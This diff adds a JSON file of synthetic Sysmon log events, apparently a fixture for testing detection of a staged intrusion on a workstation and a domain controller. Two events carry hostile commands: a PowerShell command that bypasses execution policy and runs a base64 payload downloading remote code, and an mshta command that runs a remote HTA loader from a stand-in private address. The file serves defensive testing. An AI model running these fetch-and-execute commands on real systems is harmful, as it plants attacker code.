@@ -1,0 +1,67 @@
+[
+  {
+    "EventID": "1",
+    "TimeCreated": "2024-03-15T08:03:05.000Z",
+    "Computer": "WORKSTATION-42",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+    "Hashes": "SHA256=AABBCCDD1122334455667788AABBCCDD1122334455667788AABBCCDD11223344",
+    "Channel": "Microsoft-Windows-Sysmon/Operational"
+  },
+  {
+    "EventID": "3",
+    "TimeCreated": "2024-03-15T08:03:10.000Z",
+    "Computer": "WORKSTATION-42",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "DestinationIp": "192.168.1.200",
+    "DestinationPort": "443",
+    "Protocol": "tcp",
+    "Initiated": "true",
+    "Channel": "Microsoft-Windows-Sysmon/Operational"
+  },
+  {
+    "EventID": "11",
+    "TimeCreated": "2024-03-15T08:03:15.000Z",
+    "Computer": "WORKSTATION-42",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "TargetFilename": "C:\\ProgramData\\update\\payload.exe",
+    "Channel": "Microsoft-Windows-Sysmon/Operational"
+  },
+  {
+    "EventID": "22",
+    "TimeCreated": "2024-03-15T08:03:20.000Z",
+    "Computer": "WORKSTATION-42",
+    "User": "CORP\\jsmith",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "QueryName": "a1b2c3d4e5f6.update-cdn-delivery-service-platform.corp-analytics-tracker.example-malicious-domain.net",
+    "QueryStatus": "0",
+    "Channel": "Microsoft-Windows-Sysmon/Operational"
+  },
+  {
+    "EventID": "1",
+    "TimeCreated": "2024-03-15T09:05:00.000Z",
+    "Computer": "DC-01",
+    "User": "CORP\\Administrator",
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "mshta.exe http://192.168.1.200/loader.hta",
+    "Hashes": "SHA256=1122334455667788AABBCCDD1122334455667788AABBCCDD1122334455667788",
+    "Channel": "Microsoft-Windows-Sysmon/Operational"
+  },
+  {
+    "EventID": "3",
+    "TimeCreated": "2024-03-15T09:05:05.000Z",
+    "Computer": "DC-01",
+    "User": "CORP\\Administrator",
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "DestinationIp": "192.168.1.200",
+    "DestinationPort": "80",
+    "Protocol": "tcp",
+    "Initiated": "true",
+    "Channel": "Microsoft-Windows-Sysmon/Operational"
+  }
+]
